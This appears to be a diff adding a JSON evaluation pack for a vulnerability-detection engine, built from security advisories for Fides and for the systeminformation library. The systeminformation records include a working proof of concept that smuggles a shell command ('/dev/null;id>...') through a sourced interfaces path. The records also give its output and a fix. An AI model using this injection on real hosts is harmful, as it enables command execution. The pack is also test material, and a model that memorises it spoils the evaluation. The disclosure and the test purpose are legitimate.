@@ -1,0 +1,2933 @@
+{
+  "capture_count": 11,
+  "created_at": "2026-08-15T03:57:33.494968+00:00",
+  "engine_baseline_commit": "b8b15261cc4049a1e5e425a83e57b6378a856113",
+  "engine_output_used": false,
+  "evaluation_kind": "fresh_blind_v7_priority0_role_aware_source_pack_unscored",
+  "families": [
+    {
+      "canonical_reference": "https://github.com/ethyca/fides/security/advisories/GHSA-qx5f-ghc2-7g5c",
+      "capture_id": "v7-business_logic-positive",
+      "current_missing_requirements": [
+        "control_is_present_without_literal_override"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": false,
+      "family": "business_logic",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 1,
+      "human_adjudication_performed": false,
+      "record_count": 3,
+      "records": [
+        {
+          "heading": "Am I affected?",
+          "metadata": {
+            "canonical_reference": "https://github.com/ethyca/fides/security/advisories/GHSA-qx5f-ghc2-7g5c",
+            "snapshot_sha256": "bcaa0648a7943c5b71da6774441555bfbd418081bf3099ec12e3f5d6dd6c19ea",
+            "source_root": "GHSA-qx5f-ghc2-7g5c"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 1,
+            "identity": 0,
+            "override": 0,
+            "surface": 0
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [
+              "read_only_contract"
+            ],
+            "identity": [],
+            "override": [],
+            "surface": []
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "This vulnerability only affects deployments that use Fides's privacy request (data subject request) features, also known collectively as \"Lethe\". Deployments that do not submit, process, or manage privacy requests through Fides are not affected.\n\nWithin deployments that do use privacy request features, your deployment is affected if both of the following settings are effectively set to `true`:\n\n- `subject_identity_verification_required`\n- `privacy_request_duplicate_detection.enabled`\n\nBoth settings default to `false`.\n\nEach setting can be configured in multiple places. If the same setting is configured in more than one place, Fides resolves conflicts in the following precedence order, highest priority first:\n\n1. **Admin UI / configuration API** - stored in the application database and applied at runtime\n2. **Environment variables** - read at webserver startup\n3. **`fides.toml`** - read at webserver startup\n4. **Default value** - used if none of the above set the value\n\nTo determine whether your deployment is affected, check each setting in every location that applies to your configuration management.\n\n**`subject_identity_verification_required`**\n\n- `fides.toml`: under the `[execution]` section as `subject_identity_verification_required = true`\n- Environment variable: `FIDES__EXECUTION__SUBJECT_IDENTITY_VERIFICATION_REQUIRED=true`\n- No Admin UI control - this setting is not exposed through the Admin UI and cannot be set via the configuration API\n\n**`privacy_request_duplicate_detection.enabled`**\n\n- `fides.toml`: under the `[privacy_request_duplicate_detection]` section as `enabled = true`\n- Environment variable: `FIDES__PRIVACY_REQUEST_DUPLICATE_DETECTION__ENABLED=true`\n- Admin UI: **Settings \u2192 Privacy requests \u2192 Duplicate detection**, via the \"Enable duplicate detection\" toggle. The toggle reflects only values set through the Admin UI or configuration API. A value set via `fides.toml` or environment variable will not appear here.\n\n<figure>\n<img width=\"1392\" height=\"940\" alt=\"GHSA - Duplicate Detection Enabled\" src=\"https://github.com/user-attachments/assets/e384f273-ce68-403c-adb2-93536eca5f3a\" />\n<figcaption>\n<em>\nThe \"Enable duplicate detection\" toggle when it's enabled, under Settings \u2192 Privacy requests in the Admin UI.\n</em>\n</figcaption>\n</figure>",
+          "text_sha256": "12f1abe47375689df15d523f5313dc3892b96aba11a834fd4bd2883a2a7bfac0"
+        },
+        {
+          "heading": "Workarounds",
+          "metadata": {
+            "canonical_reference": "https://github.com/ethyca/fides/security/advisories/GHSA-qx5f-ghc2-7g5c",
+            "snapshot_sha256": "bcaa0648a7943c5b71da6774441555bfbd418081bf3099ec12e3f5d6dd6c19ea",
+            "source_root": "GHSA-qx5f-ghc2-7g5c"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "approval"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "Disable duplicate detection by setting `privacy_request_duplicate_detection.enabled` to `false`. This can be changed under **Settings \u2192 Privacy Requests \u2192 Duplicate detection** in the Admin UI). This fully mitigates the vulnerability and is the recommended interim workaround for deployments that cannot immediately upgrade.\n\n<figure>\n<p>\n<img width=\"1392\" height=\"880\" alt=\"GHSA - Disable Duplicate Detection\" src=\"https://github.com/user-attachments/assets/fc0c87a1-7e40-4698-ba9e-e1721f591310\" />\n<figcaption>\n<em>\nThe \"Enable duplicate detection\" toggle when it's disabled, under Settings \u2192 Privacy requests in the Admin UI.\n</em>\n</figcaption>\n<p>\n</figure>\n\nAdministrators of deployments that must retain duplicate detection should deny or delete, rather than approve, any privacy request whose identity has not been verified. This reduces the likelihood of exploitation but relies on administrator vigilance during each triage action.\n\n<img width=\"1392\" height=\"1044\" alt=\"GHSA - Admin Approval of Unverified Privacy Request\" src=\"https://github.com/user-attachments/assets/b2ad4940-40d3-468b-897e-8cca6ce4707e\" />\n<figcaption>\n<em>\nAn administrator's view when approving an unverified privacy request in the Admin UI.\n</em>\n</figcaption>\n</figure>",
+          "text_sha256": "ab6b3e733aff7a865224967fa78d4d3b9e75e9147932b34e9be69a46347ca7b5"
+        },
+        {
+          "heading": "Severity",
+          "metadata": {
+            "canonical_reference": "https://github.com/ethyca/fides/security/advisories/GHSA-qx5f-ghc2-7g5c",
+            "snapshot_sha256": "bcaa0648a7943c5b71da6774441555bfbd418081bf3099ec12e3f5d6dd6c19ea",
+            "source_root": "GHSA-qx5f-ghc2-7g5c"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "approval",
+              "state"
+            ]
+          },
+          "source_state_role": "unclassified_source_state",
+          "text": "This vulnerability has been assigned a severity of **MEDIUM**.\n\nThe rating reflects the fact that exploitation requires an administrator to approve the malicious request. An attacker alone cannot cause a privacy request to be processed. The administrative interface understates the verification state of a duplicate-classified request, which increases the likelihood of inadvertent approval during routine triage, but without administrator user interaction the vulnerability is not exploitable.\n\nThe related denial-of-service issue addressed in the same patch is also rated medium-severity in isolation and does not raise the overall severity of this advisory.",
+          "text_sha256": "f6f66603381c034be3ca8c60b571ec0ddc0cdd2bdca18391ef2d35f018b28d3c"
+        }
+      ],
+      "scoring_executed": false,
+      "source_project": "ethyca/fides",
+      "source_replacement_used": false,
+      "source_root": "GHSA-qx5f-ghc2-7g5c",
+      "source_snapshot_sha256": "bcaa0648a7943c5b71da6774441555bfbd418081bf3099ec12e3f5d6dd6c19ea",
+      "standards_rubric": {
+        "counts_as_target_evidence": false,
+        "cwe_ids": [
+          "CWE-841"
+        ],
+        "owasp_ids": [
+          "A06:2025"
+        ],
+        "principle": "Business-operation names are only hypotheses; promotion requires an observed violation of a business workflow/value/state invariant.",
+        "wstg_ids": [
+          "WSTG-BUSL-01",
+          "WSTG-BUSL-06"
+        ]
+      },
+      "target_contact_performed": false,
+      "third_party_code_executed": false,
+      "unclassified_record_count": 1,
+      "vulnerable_condition_record_count": 0,
+      "vulnerable_identity_or_surface_record_count": 0,
+      "vulnerable_state_record_count": 1,
+      "writeup_rubric_sha256": "4b46fa8521d13b92facee26e52a26f724a0db9259b367491dbb960fa4521e4f4",
+      "writeups_count_as_target_evidence": false
+    },
+    {
+      "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+      "capture_id": "v7-command_injection-positive",
+      "current_missing_requirements": [
+        "literal_decisive_condition"
+      ],
+      "engine_output_used": false,
+      "exact_revision_pair_identity_match": true,
+      "exact_revision_pair_present_in_historical_pack": true,
+      "exact_revision_pair_skipped_due_identity_mismatch": false,
+      "exact_revision_pair_used": true,
+      "family": "command_injection",
+      "first_blind_consumed": false,
+      "fixed_state_record_count": 6,
+      "human_adjudication_performed": false,
+      "record_count": 18,
+      "records": [
+        {
+          "heading": null,
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_summary",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "command"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "systeminformation: OS command injection in networkInterfaces() via interfaces(5) source-directive path on Linux",
+          "text_sha256": "5f423fe48111401262a5d6912bafc70d757805cb95360fff3611881a3e3e0163"
+        },
+        {
+          "heading": "Summary",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 2,
+            "identity": 3,
+            "override": 0,
+            "surface": 3
+          },
+          "signal_hits": {
+            "condition": [
+              "process_execution_reached"
+            ],
+            "control": [
+              "exec_file_argument_array",
+              "input_not_used_in_command"
+            ],
+            "identity": [
+              "command_execution_surface",
+              "process_execution_surface",
+              "shell_command_semantic"
+            ],
+            "override": [],
+            "surface": [
+              "command",
+              "shell",
+              "system("
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "On Linux, `systeminformation`'s `networkInterfaces()` is vulnerable to OS command injection through the Debian/Ubuntu `interfaces(5)` `source` directive. While collecting per-interface DHCP state, the library reads `/etc/network/interfaces` and, for every `source <path>` line it encounters, extracts the path token *from the file content* and interpolates it **unquoted** into a shell command string that is run via `execSync()`. A `source` line whose path contains shell metacharacters executes arbitrary commands with the privileges of the calling Node.js process.\n\nThis is the same root-cause class as the previously-fixed NetworkManager-connection-name injection in this file: a value parsed out of local system state is re-interpolated into a shell command string without sanitization. The NetworkManager paths were converted to argument-array execution, but the `interfaces(5)` `source`-recursion sink in `checkLinuxDCHPInterfaces()` was left unfixed and still builds a shell string. The input to this sink is *unsanitized* (unlike the `iface`/`connectionName` paths, which pass through `util.sanitizeString` in strict mode before reaching their commands).",
+          "text_sha256": "69dcb614ed25b32990bf821240a2c86a61f2f3e22ded897d659d7ff7b2f498d8"
+        },
+        {
+          "heading": "Impact",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 0,
+            "identity": 2,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [
+              "process_execution_reached"
+            ],
+            "control": [],
+            "identity": [
+              "command_execution_surface",
+              "process_execution_surface"
+            ],
+            "override": [],
+            "surface": [
+              "command"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "An attacker who can place or influence a `source`d path in `/etc/network/interfaces` (or any file it transitively `source`s) achieves command execution inside any process that calls `networkInterfaces()`. Realistic affected deployments are the same ones that motivate this library:\n\n- local inventory / asset agents\n- monitoring and diagnostics agents\n- admin-dashboard backends collecting host information\n- device-management / desktop agents\n\nIf such a process runs with elevated privileges, the injected command runs with those privileges. `networkInterfaces()` is a core, frequently-called API and is reached transitively by `getStaticData()` / `getAllData()`, so the sink is exercised by ordinary usage on Linux.",
+          "text_sha256": "aa5252e822e6f1c64a8fabf7c5244564be53115bad3f6a382bd4661be542be35"
+        },
+        {
+          "heading": "Threat model",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 2,
+            "identity": 1,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [
+              "exec_file_argument_array",
+              "input_not_used_in_command"
+            ],
+            "identity": [
+              "shell_command_semantic"
+            ],
+            "override": [],
+            "surface": [
+              "command",
+              "shell"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "The dangerous value is **not** a function argument supplied by the caller. It is read from the *content* of an `interfaces(5)` configuration file. The stock Debian/Ubuntu layout uses `source /etc/network/interfaces.d/*` and `source-directory` fan-out, so the parser routinely follows `source` directives into other files and re-parses their `source` lines. Any actor who can write a file that becomes reachable through that `source` chain \u2014 for example a lower-privileged process or configuration-management hook that drops a file into a `source`d directory, or a tool that materializes an interfaces snippet from semi-trusted input \u2014 controls the path token that lands in the shell command. No NetworkManager activation or special hardware is required; the only precondition is that one `source`d path string contains shell metacharacters.",
+          "text_sha256": "0557d58995943d5e99705935a8afc2cbb1cdf0bc0b5b479f133c23f71cb706c1"
+        },
+        {
+          "heading": "Vulnerable code",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "shell"
+            ]
+          },
+          "source_state_role": "unclassified_source_state",
+          "text": "`lib/network.js`, `checkLinuxDCHPInterfaces()` (current `5.31.6` line numbers):\n\n```js\n// lib/network.js\nfunction checkLinuxDCHPInterfaces(file) {\n  let result = [];\n  try {\n    const cmd = `cat ${file} 2> /dev/null | grep 'iface\\\\|source'`;   // <-- unquoted ${file} -> shell sink\n    const lines = execSync(cmd, util.execOptsLinux).toString().split('\\n');\n\n    lines.forEach((line) => {\n      const parts = line.replace(/\\s+/g, ' ').trim().split(' ');\n      if (parts.length >= 4) {\n        if (line.toLowerCase().indexOf(' inet ') >= 0 && line.toLowerCase().indexOf('dhcp') >= 0) {\n          result.push(parts[1]);\n        }\n      }\n      if (line.toLowerCase().includes('source')) {\n        const file = line.split(' ')[1];                              // <-- path parsed FROM file content\n        result = result.concat(checkLinuxDCHPInterfaces(file));        // <-- recurses, re-feeding attacker path\n      }\n    });\n  } catch {\n    util.noop();\n  }\n  return result;\n}\n```\n\n`util.execOptsLinux` sets no `shell` option, so `execSync(cmd, util.execOptsLinux)` runs `cmd` through `/bin/sh`. The `${file}` token is interpolated raw \u2014 not quoted, not passed through `util.sanitizeString`/`sanitizeShellString` \u2014 so `;`, `$( )`, backticks, `|`, `&`, redirections, and even a bare space all break out of the intended `cat`/`grep` pipeline.\n\nReach chain to the public API:\n\n```js\n// lib/network.js, getLinuxDHCPNics()\nresult = checkLinuxDCHPInterfaces('/etc/network/interfaces');\n```\n\n```js\n// lib/network.js, networkInterfaces() (Linux branch)\n_dhcpNics = getLinuxDHCPNics();\n```\n\n`networkInterfaces()` is also reached by `getStaticData()` and `getAllData()` in `lib/index.js`.",
+          "text_sha256": "25ac4886eca7705a69fcd8b5495faaf57c7d74e6ad61efc8a2e2250da468d6d7"
+        },
+        {
+          "heading": "Reproduction",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 2,
+            "control": 1,
+            "identity": 3,
+            "override": 0,
+            "surface": 3
+          },
+          "signal_hits": {
+            "condition": [
+              "command_output_observed",
+              "process_execution_reached"
+            ],
+            "control": [
+              "input_not_used_in_command"
+            ],
+            "identity": [
+              "command_execution_surface",
+              "process_execution_surface",
+              "shell_command_semantic"
+            ],
+            "override": [],
+            "surface": [
+              "bash",
+              "command",
+              "shell"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "The PoC exercises the **verbatim shipped sink function** extracted from the installed `node_modules/systeminformation/lib/network.js` (version pinned to `5.31.6`), bound to the same `child_process.execSync` and shipped `util.execOptsLinux` the library uses. It then drives the exact `source`-recursion data flow with a malicious sourced path. A negative control with a benign path confirms no execution occurs on well-formed input.\n\nInstall the pinned vulnerable version:\n\n```bash\nmkdir si-poc && cd si-poc\nnpm init -y >/dev/null\nnpm install systeminformation@5.31.6\n```\n\n`poc.js`:\n\n```js\nconst fs = require('fs');\nconst path = require('path');\nconst cp = require('child_process');\nconst libDir = path.join(__dirname, 'node_modules', 'systeminformation', 'lib');\nconst util = require(path.join(libDir, 'util.js'));\n\n// Load the VERBATIM shipped sink function from the installed library source.\nconst src = fs.readFileSync(path.join(libDir, 'network.js'), 'utf8');\nconst m = src.match(/function checkLinuxDCHPInterfaces\\(file\\) \\{[\\s\\S]*?\\n\\}\\n/);\nif (!m) { console.error('could not locate shipped function'); process.exit(2); }\n\n// Bind the same free vars network.js binds: execSync + util.\nconst execSync = cp.execSync;\nconst checkLinuxDCHPInterfaces =\n  new Function('execSync', 'util', m[0] + '\\nreturn checkLinuxDCHPInterfaces;')(execSync, util);\n\n// --- Malicious case: a sourced interfaces file with shell metacharacters in the path ---\nconst tmp = fs.mkdtempSync('/tmp/si-dhcp-');\nconst outer = path.join(tmp, 'interfaces');\nconst marker = path.join(tmp, 'PWNED');\nconst maliciousSource = `/dev/null;id>${marker};echo`;\nfs.writeFileSync(outer, `auto lo\\niface lo inet loopback\\nsource ${maliciousSource}\\n`);\n\nconsole.log('PRE  marker_exists=' + fs.existsSync(marker));\nconst res = checkLinuxDCHPInterfaces(outer);   // == networkInterfaces() -> getLinuxDHCPNics() path\nconsole.log('returned=' + JSON.stringify(res));\nconsole.log('POST marker_exists=' + fs.existsSync(marker));\nif (fs.existsSync(marker)) console.log('marker_contents=' + fs.readFileSync(marker, 'utf8').trim());\n\n// --- Negative control: a benign sourced path must NOT execute anything ---\nconst tmp2 = fs.mkdtempSync('/tmp/si-neg-');\nconst outer2 = path.join(tmp2, 'interfaces');\nconst inner2 = path.join(tmp2, 'iface.d');\nconst marker2 = path.join(tmp2, 'PWNED_NEG');\nfs.writeFileSync(inner2, 'iface eth0 inet dhcp\\n');\nfs.writeFileSync(outer2, `auto lo\\nsource ${inner2}\\n`);\nconsole.log('\\nNEG pre  marker_exists=' + fs.existsSync(marker2));\nconst res2 = checkLinuxDCHPInterfaces(outer2);\nconsole.log('NEG returned=' + JSON.stringify(res2));\nconsole.log('NEG post marker_exists=' + fs.existsSync(marker2));\n```\n\nRun it:\n\n```bash\nnode poc.js\n```\n\nVerbatim captured output (against `systeminformation@5.31.6`):\n\n```\nPRE  marker_exists=false\nreturned=[]\nPOST marker_exists=true\nmarker_contents=uid=501(rick) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)\n\nNEG pre  marker_exists=false\nNEG returned=[\"eth0\"]\nNEG post marker_exists=false\n```\n\nThe malicious `source` path caused the injected `id` command to run (marker created, contents = the calling process identity), while the benign `source` path parsed normally (`[\"eth0\"]`) and produced no marker. The injected command runs with the privileges of the Node.js process that called `networkInterfaces()`.",
+          "text_sha256": "8f4411a139727120493b6e4a207073a5d5ed3384174e36fe9f34f0742c7b1a7e"
+        },
+        {
+          "heading": "End-to-end reproduction",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "bash"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "The transcript above is the end-to-end run against the pinned published artifact `systeminformation@5.31.6`, loading the shipped `lib/network.js` and `lib/util.js` from `node_modules`. Exact commands:\n\n```bash\nmkdir si-poc && cd si-poc\nnpm init -y >/dev/null\nnpm install systeminformation@5.31.6",
+          "text_sha256": "18a6f4aa3e65b0c623980a09867c0fdf90399af14f67b1bc3ff6b125beb5aaf9"
+        },
+        {
+          "heading": "place poc.js (from the Reproduction section) in this directory",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 1
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "command"
+            ]
+          },
+          "source_state_role": "vulnerable_or_impact_state",
+          "text": "node poc.js\n```\n\nThe marker file `PWNED` is created only by the injected command path; the negative-control marker `PWNED_NEG` is never created. The verbatim captured stdout is shown in the Reproduction section above.",
+          "text_sha256": "e67bf4488560be23fbb29abbc0c0c0ef976ab9b1ff79b046042c2077b65ec244"
+        },
+        {
+          "heading": "Suggested fix",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 1,
+            "identity": 3,
+            "override": 0,
+            "surface": 3
+          },
+          "signal_hits": {
+            "condition": [
+              "process_execution_reached"
+            ],
+            "control": [
+              "exec_file_argument_array"
+            ],
+            "identity": [
+              "command_execution_surface",
+              "process_execution_surface",
+              "shell_command_semantic"
+            ],
+            "override": [],
+            "surface": [
+              "command",
+              "shell",
+              "system("
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "Stop building a shell string from a path that comes out of file content. Read the file with `fs` (no shell), or use argument-array execution, and never interpolate a parsed `source` path into a shell command. For example:\n\n```js\nfunction checkLinuxDCHPInterfaces(file) {\n  let result = [];\n  try {\n    // No shell: read the file directly and filter in JS.\n    const content = require('fs').readFileSync(file, { encoding: 'utf8' });\n    const lines = content.split('\\n').filter((l) => /iface|source/.test(l));\n    lines.forEach((line) => {\n      const parts = line.replace(/\\s+/g, ' ').trim().split(' ');\n      if (parts.length >= 4 &&\n          line.toLowerCase().indexOf(' inet ') >= 0 &&\n          line.toLowerCase().indexOf('dhcp') >= 0) {\n        result.push(parts[1]);\n      }\n      if (line.toLowerCase().includes('source')) {\n        const sourced = line.split(' ')[1];\n        result = result.concat(checkLinuxDCHPInterfaces(sourced));\n      }\n    });\n  } catch {\n    require('./util').noop();\n  }\n  return result;\n}\n```\n\nIf shelling out is preferred, replace the `cat`/`grep` shell string with argument-array execution as shown below, so the path is passed as a single argv element and the shell never re-parses it:\n\n```js\nconst { execFileSync } = require('child_process');\nconst content = execFileSync('cat', [file], util.execOptsLinux).toString();\n```\n\nQuoting alone is insufficient. Treat every value parsed from `interfaces(5)` files as untrusted even though it originates from local system state, consistent with the defensive `util.sanitizeString` pattern already applied to the interface name and NetworkManager connection name on the sibling paths.",
+          "text_sha256": "786531ce819e0cdea83e1694892a55396a4c1d08d2832910843054378f44bf94"
+        },
+        {
+          "heading": "Fix PR",
+          "metadata": {
+            "canonical_reference": "https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839",
+            "snapshot_sha256": "7cf515af6312d6b3c16de92b9fc1bb4254f7f5924ce439412ff37dbf31b8ee58",
+            "source_root": "GHSA-5xpp-75jx-m839"
+          },
+          "origin": "authoritative_advisory_description",
+          "signal_hit_counts": {
+            "condition": 1,
+            "control": 1,
+            "identity": 1,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [
+              "shell_metacharacter_effect"
+            ],
+            "control": [
+              "input_not_used_in_command"
+            ],
+            "identity": [
+              "shell_command_semantic"
+            ],
+            "override": [],
+            "surface": [
+              "command",
+              "shell"
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "A fix is provided on a private temporary fork (not pushed to any public fork during the embargo). The branch replaces the `cat ${file}` shell string in `checkLinuxDCHPInterfaces()` with a non-shell `fs.readFileSync` read and adds a Linux regression test that points the function at an `interfaces` file containing a `source` directive with shell metacharacters and asserts that no side-effect command runs (no marker file is produced) while a benign sourced DHCP interface is still parsed.",
+          "text_sha256": "8dca213a22e7f0fc3eace62eb03684c93982c097cc24fd49805233437740ee49"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "a75dfbc89f20201aedef9b7a77ea123e55feee40d2a68755dfd00da2a933ae2e",
+            "filename": "CHANGELOG.md",
+            "line_end": 101,
+            "line_start": 88,
+            "parent_sha": "da1cbf5eb09907cf5c3431f4c9ea441b7a227617"
+          },
+          "origin": "exact_revision_parent",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "command",
+              "system("
+            ]
+          },
+          "source_state_role": "vulnerable_parent_state",
+          "text": "For major (breaking) changes - **version 4, 3 and 2** - see end of page.\n\n## Version History\n\n| Version | Date       | Comment                                                                                             |\n| ------- | ---------- | --------------------------------------------------------------------------------------------------- |\n| 5.31.6  | 2026-05-07 | `networkInterfaces()` fix unsanitized command (linux)                                               |\n| 5.31.5  | 2026-03-19 | `netStats()` netstat command adaption (mac OS)                                                      |\n| 5.31.4  | 2026-03-09 | `diskLayout()` USB tahoe compatibility  (mac OS)                                                    |\n| 5.31.3  | 2026-03-04 | `system()` updated Mac 2026 mopdel numbers (mac OS)                                                 |\n| 5.31.2  | 2026-03-03 | `system()` updated Mac mopdel numbers (mac OS)                                                      |\n| 5.31.1  | 2026-02-17 | `docs` updated (security advisory)                                                                  |\n| 5.31.0  | 2026-02-15 | `diskLayout()` added smartmontools support (macOS), `versions()` command injection issue (linux)    |\n| 5.30.8  | 2026-02-14 | `wifiNetworks()` fixed CWE-78 command injection issue (linux)                                       |",
+          "text_sha256": "e969735b628d720d1e62a7f6f116a29bd05a94be65b215691ab2a624fc437bac"
+        },
+        {
+          "heading": null,
+          "metadata": {
+            "file_sha256": "0fd51ff2a5436694685f348353cd4828a621d2ec0ea7219ce0ad2097793ac2d7",
+            "filename": "CHANGELOG.md",
+            "fix_sha": "bbfddde48672d0ee124fefdb3cb4442fd9dd4f03",
+            "line_end": 102,
+            "line_start": 88
+          },
+          "origin": "exact_revision_fix",
+          "signal_hit_counts": {
+            "condition": 0,
+            "control": 0,
+            "identity": 0,
+            "override": 0,
+            "surface": 2
+          },
+          "signal_hits": {
+            "condition": [],
+            "control": [],
+            "identity": [],
+            "override": [],
+            "surface": [
+              "command",
+              "system("
+            ]
+          },
+          "source_state_role": "fixed_or_remediation_state",
+          "text": "For major (breaking) changes - **version 4, 3 and 2** - see end of page.\n\n## Version History\n\n| Version | Date       | Comment                                                                                             |\n| ------- | ---------- | --------------------------------------------------------------------------------------------------- |\n| 5.31.7  | 2026-05-29 | `networkInterfaces()` fix unsanitized command (linux)                                               |\n| 5.31.6  | 2026-05-07 | `networkInterfaces()` fix unsanitized command (linux)                                               |\n| 5.31.5  | 2026-03-19 | `netStats()` netstat command adaption (mac OS)                                                      |\n| 5.31.4  | 2026-03-09 | `diskLayout()` USB tahoe compatibility  (mac OS)                                                    |\n| 5.31.3  | 2026-03-04 | `system()` updated Mac 2026 mopdel numbers (mac OS)                                                 |\n| 5.31.2  | 2026-03-03 | `system()` updated Mac mopdel numbers (mac OS)                                                      |\n| 5.31.1  | 2026-02-17 | `docs` updated (security advisory)                                                                  |\n| 5.31.0  | 2026-02-15 | `diskLayout()` added smartmontools support (macOS), `versions()` command injection issue (linux)    |\n| 5.30.8  | 2026-02-14 | `wifiNetworks()` fixed CWE-78 command injection issue 